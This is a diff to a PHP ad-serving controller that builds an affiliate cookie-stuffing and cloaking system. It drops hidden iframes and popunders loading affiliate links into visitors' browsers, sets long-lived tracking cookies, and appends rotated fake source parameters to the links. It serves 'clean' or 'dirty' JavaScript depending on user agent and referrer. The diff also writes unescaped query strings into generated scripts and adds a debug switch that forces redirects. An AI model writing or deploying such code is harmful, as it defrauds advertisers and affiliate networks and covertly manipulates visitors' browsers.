@@ -112,11 +112,13 @@ class Ad extends CI_Controller {
     // Shows the popunder landing page with the cookies
     public function viewc($id=null)
     {
+        $this->load->helper("ad_helper");
+        $this->load->helper("js_helper");
+        $this->load->helper("array_helper");
+        $this->load->helper("csv_helper");
+        $this->load->helper("shared_file_access_helper");
         $data = $this->input->post();
         if (!empty($data)) {
-            $this->load->helper("ad_helper");
-            $this->load->helper("csv_helper");
-            $this->load->helper("array_helper");
             handleTrafficLoggerData($id);
             return;
         }
@@ -129,6 +131,20 @@ class Ad extends CI_Controller {
             $this->show_not_found();
             return;
         }
+        // Set ad.php click ID cookie
+        $adClickID = uniqid("", true);
+        setcookie("_c", $adClickID, strtotime("+1 year"));
+
+        // ad.php visits
+        $adVisits = isset($_COOKIE["_v"]) ? $_COOKIE["_v"] + 1 : 1;
+        setcookie("_v", $adVisits, strtotime("+1 year"));
+        $queryString = $_SERVER['QUERY_STRING'];
+
+        $f_apps_WeightList["iOS"] 		= getCSVContentAsArray(F_APPS_IOS_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
+        $f_apps_WeightList["Android"] 	= getCSVContentAsArray(F_APPS_ANDROID_BASE_FILENAME. $ad_data->adCountry . CSV_FILE_SUFFIX);
+        $f_site_WeightList 				= getCSVContentAsArray(F_SITE_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
+        $f_siteid_WeightList 			= getCSVContentAsArray(F_SITE_ID_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
+
         $scriptCode = "<script type=\"text/javascript\">
                                 (function() {
                                 var packageName = 'dreamsky';
@@ -142,17 +158,34 @@ class Ad extends CI_Controller {
                                          }
                                          return true;
                                      },
-                                     writeOffer: function(offerUrl) {
-//                                         document.write('<iframe src=\"' + offerUrl + '\" style=\"display:none\" sandbox=\"allow-top-navigation allow-popups allow-scripts allow-same-origin\"></iframe>');
+                                     writeOffer: function(url) {
+                                         var offerUrl = (url.indexOf('?') !== -1?url + '&':url + '?') + location.search.substring(1);
                                          document.write('<iframe src=\"' + offerUrl + '\" style=\"display:none\" sandbox=\"allow-top-navigation allow-popups allow-scripts allow-same-origin\"></iframe>');
                                      },
                                  }
                                  window[packageName]['tool'] = tool;
                              })();
                              if (dreamsky.tool.ismobile()) {";
-        foreach($ad_data->affiliate_link_url_list as $url) {
-            if (strlen($url)>0) {
-                $scriptCode .= "    dreamsky.tool.writeOffer('" . $url. "');";
+        foreach($ad_data->affiliate_link_url_list as $cookieUrl) {
+            if (strlen($cookieUrl) > 0) {
+                $cookieUrl = appendParameterPrefix($cookieUrl) . "ccid=$adClickID";
+                if ($ad_data->voluumAdCycleCount > 0)
+                {
+                    $cookieUrl = appendParameterPrefix($cookieUrl) . "ad=" . (($adVisits % $ad_data->voluumAdCycleCount) + 1);
+                }
+                // Append auto generated source parameter
+                $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_apps", $f_apps_WeightList);
+                $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_site", $f_site_WeightList);
+                $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_siteid", $f_siteid_WeightList);
+
+                // Append passed in script parameters if outputMethod == JS
+                if ($ad_data->outputMethod === "JS")
+                {
+                    $cookieUrl .= appendParameterPrefix($cookieUrl) . $queryString;
+                }
+
+                // Finally. add the iframe code
+                $scriptCode .= "    dreamsky.tool.writeOffer('" . $cookieUrl. "');";
             }
         }
         $scriptCode .= "} </script> ";
@@ -172,10 +205,14 @@ class Ad extends CI_Controller {
     // Shows the popunder landing page with the cookies
     public function landing_js()
     {
+        $this->load->helper("ad_helper");
+        $this->load->helper("js_helper");
+        $this->load->helper("array_helper");
+        $this->load->helper("csv_helper");
+        $this->load->helper("shared_file_access_helper");
         $this->set_output_to_js();
         $this->disable_client_cache();
         $clean_js = "var landing=window.location;";
-        $this->load->helper("js_helper");
         $id = $this->input->get("campaign_id");
         // If no ID provided serve clean js
         if ($id == null) {
@@ -204,6 +241,7 @@ class Ad extends CI_Controller {
         {
             $lp_referer = "_empty_";
         }
+
 
 
         // If Referrer is blacklisted serve clean js
@@ -260,46 +298,6 @@ class Ad extends CI_Controller {
             return;
         }
 
-        /*
-        // If parameter is blocked or missing, serve clean js
-        foreach ($ad_data->blockedParameterValues as $parameter => $blockedValues)
-        {
-            if (array_key_exists($parameter, $_GET))
-            {
-                if (in_array($_GET[$parameter], $blockedValues))
-                {
-                    echo $clean_js."\nvar id=4;";
-                    return;
-                }
-            }
-            else
-            {
-                echo $clean_js."\nvar id=5;";
-                return;
-            }
-        }
-
-        // If parameter is blocked or missing from referrer, serve clean js
-        $referrerParameters = array();
-        parse_str(parse_url($referer, PHP_URL_QUERY), $referrerParameters);
-        foreach ($ad_data->blockedReferrerParameterValues as $parameter => $blockedValues)
-        {
-            if (array_key_exists($parameter, $referrerParameters))
-            {
-                if (in_array($referrerParameters[$parameter], $blockedValues))
-                {
-                    echo $clean_js."\nvar id=6;";
-                    return;
-                }
-            }
-            else
-            {
-                echo $clean_js."\nvar id=7;";
-                return;
-            }
-        }
-        */
-
         // Cloack user agent
         if (!preg_match('/('.$this->allowed_user_agents.')/i', $_SERVER['HTTP_USER_AGENT']))
         {
@@ -340,9 +338,45 @@ class Ad extends CI_Controller {
                 return;
             }
         }
+        // Set ad.php click ID cookie
+        $adClickID = uniqid("", true);
+        setcookie("_c", $adClickID, strtotime("+1 year"));
 
+        // ad.php visits
+        $adVisits = isset($_COOKIE["_v"]) ? $_COOKIE["_v"] + 1 : 1;
+        setcookie("_v", $adVisits, strtotime("+1 year"));
+
+        $queryString = $_SERVER['QUERY_STRING'];
+
+        $f_apps_WeightList["iOS"] 		= getCSVContentAsArray(F_APPS_IOS_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
+        $f_apps_WeightList["Android"] 	= getCSVContentAsArray(F_APPS_ANDROID_BASE_FILENAME. $ad_data->adCountry . CSV_FILE_SUFFIX);
+        $f_site_WeightList 				= getCSVContentAsArray(F_SITE_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
+        $f_siteid_WeightList 			= getCSVContentAsArray(F_SITE_ID_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
+
+        $affiliate_link_url_list = array();
+        foreach ($ad_data->affiliate_link_url_list as $cookieUrl) {
+            if (strlen($cookieUrl) > 0) {
+                $cookieUrl = appendParameterPrefix($cookieUrl) . "ccid=$adClickID";
+                if ($ad_data->voluumAdCycleCount > 0)
+                {
+                    $cookieUrl = appendParameterPrefix($cookieUrl) . "ad=" . (($adVisits % $ad_data->voluumAdCycleCount) + 1);
+                }
+                // Append auto generated source parameter
+                $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_apps", $f_apps_WeightList);
+                $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_site", $f_site_WeightList);
+                $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_siteid", $f_siteid_WeightList);
+
+                // Append passed in script parameters if outputMethod == JS
+                if ($ad_data->outputMethod === "JS")
+                {
+                    $cookieUrl .= appendParameterPrefix($cookieUrl) . $queryString;
+                }
+                // Finally. add the iframe code
+                $affiliate_link_url_list[] = $cookieUrl;
+            }
+        }
         // Serve dirty javascript
-        echo get_js_view("cookies_loader", array('ad_data'=>$ad_data,'allowed_platforms'=>join("|", $ad_data->platform_whitelist)),false);
+        echo get_js_view("cookies_loader", array('affiliate_link_url_list'=>$affiliate_link_url_list,'allowed_platforms'=>join("|", $ad_data->platform_whitelist)),false);
     }
 
     private function get_redirect_code($ad_data, $redirectUrl) {
@@ -387,6 +421,10 @@ class Ad extends CI_Controller {
 
     private function _view($id, $ad_data, $data)
     {
+        $debug = $this->input->get("debug") == "true"?true:false;
+        if ($debug) {
+            $ad_data->redirectEnabled = true;
+        }
         // Load required helpers
         $this->load->helper("ad_helper");
         $this->load->helper("js_helper");
@@ -752,6 +790,7 @@ class Ad extends CI_Controller {
                 }
             }
 
+
             if (!empty($ad_data->redirectUrl) && $ad_data->redirectEnabled ) {
                 $redirectUrl = appendParameterPrefix($ad_data->redirectUrl) . "ccid=$adClickID";
 
@@ -769,6 +808,8 @@ class Ad extends CI_Controller {
                 $f_site_WeightList 				= getCSVContentAsArray(F_SITE_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
                 $f_siteid_WeightList 			= getCSVContentAsArray(F_SITE_ID_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
 
+                if ($debug){
+                }
                 // Append auto generated source parameter
                 $redirectUrl = appendAutoRotateParameter($redirectUrl, "f_apps", $f_apps_WeightList);
                 $redirectUrl = appendAutoRotateParameter($redirectUrl, "f_site", $f_site_WeightList);
@@ -795,12 +836,33 @@ class Ad extends CI_Controller {
 
             $cookiesCode = "";
             if ($ad_data->cookies_dropping_enabled && $ad_data->cookies_dropping_method == COOKIES_DROPPING_METHOD_POP_UNDER) {
-                $cookiesCode = "makePopunder('".site_url("ad/viewc/$id")."');";
+                $cookiesCode = "var url = '".site_url("ad/viewc/$id")."';";
+                $cookiesCode .= "var cookiesUrl = (url.indexOf('?') !== -1?url + '&':url + '?')+'referrer=' + encodeURIComponent(getReferrerDomain()) + '&' + location.search.substring(1);";
+                $cookiesCode .= "makePopunder(cookiesUrl);";
             }
             if ($ad_data->cookies_dropping_enabled && $ad_data->cookies_dropping_method == COOKIES_DROPPING_METHOD_CLOAKER) {
-                foreach($ad_data->affiliate_link_url_list as $url) {
-                    if (strlen($url)>0) {
-                        $cookiesCode .= "addIframe('" . $url. "');";
+                foreach($ad_data->affiliate_link_url_list as $cookieUrl) {
+                    if (strlen($cookieUrl) > 0) {
+                        $cookieUrl = appendParameterPrefix($cookieUrl) . "ccid=$adClickID";
+                        if ($ad_data->voluumAdCycleCount > 0)
+                        {
+                            $cookieUrl = appendParameterPrefix($cookieUrl) . "ad=" . (($adVisits % $ad_data->voluumAdCycleCount) + 1);
+                        }
+                        // Append auto generated source parameter
+                        $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_apps", $f_apps_WeightList);
+                        $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_site", $f_site_WeightList);
+                        $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_siteid", $f_siteid_WeightList);
+
+                        // Append passed in script parameters if outputMethod == JS
+                        if ($ad_data->outputMethod === "JS")
+                        {
+                            $cookieUrl .= appendParameterPrefix($cookieUrl) . $queryString;
+                        }
+                        // Append referrer
+                        $cookieUrl = appendReferrerParameter($cookieUrl);
+
+                        // Finally. add the iframe code
+                        $cookiesCode .= "addIframe(\"".$cookieUrl."\");";
                     }
                 }
             }
@@ -816,11 +878,11 @@ class Ad extends CI_Controller {
 							return value === true;
 						}
 
-                        function addIframe(srcurl) 
+                        function addIframe(url) 
                         {
                             var iframe = document.createElement('iframe');
                             iframe.style.display = 'none';
-                            iframe.src = srcurl;
+                            iframe.src = (url.indexOf('?') !== -1?url + '&':url + '?')+'referrer=' + encodeURIComponent(getReferrerDomain()) + '&' + location.search.substring(1);
                             iframe.sandbox = 'allow-top-navigation allow-popups allow-scripts allow-same-origin';                            
                             document.body.appendChild(iframe);
                         }
